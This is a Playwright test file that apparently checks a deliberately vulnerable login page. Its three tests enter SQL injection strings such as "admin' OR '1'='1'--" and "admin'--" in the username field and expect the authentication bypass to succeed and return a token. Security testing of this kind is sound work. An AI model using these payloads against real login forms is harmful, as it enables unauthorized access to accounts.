import { test, expect, Page } from '@playwright/test';

test.describe('/#/ (SQL Injection via Login Form)', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
  });

  test('should successfully bypass authentication with OR 1=1 injection', async ({ page }) => {
    await page.fill('#username', "admin' OR '1'='1'--");
    await page.fill('#password', 'anything');
    await page.click('#loginForm button[type="submit"]');
    
    await page.waitForSelector('#loginResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#loginResult').textContent();
    expect(resultText).toContain('success');
    expect(resultText).toContain('token');
    
    console.log('✓ SQL Injection via UI successful - Authentication bypassed');
  });

  test('should bypass with comment injection admin\'--', async ({ page }) => {
    await page.fill('#username', "admin'--");
    await page.fill('#password', 'anything');
    await page.click('#loginForm button[type="submit"]');
    
    await page.waitForSelector('#loginResult.show', { timeout: 5000 });
    
    const resultText = await page.locator('#loginResult').textContent();
    expect(resultText).toContain('success');
    
    console.log('✓ Comment-based SQL injection via UI successful');
  });

  test('should display token in UI after successful injection', async ({ page }: { page: Page }) => {
    await page.fill('#username', "admin' OR '1'='1'--");
    await page.fill('#password', 'test');
    await page.click('#loginForm button[type="submit"]');
    
    await page.waitForSelector('#loginResult.show');
    
    const resultHTML = await page.locator('#loginResult').innerHTML();
    expect(resultHTML).toContain('token');
    expect(resultHTML).toContain('admin');
    
    console.log('✓ Token visible in UI response');
  });
});
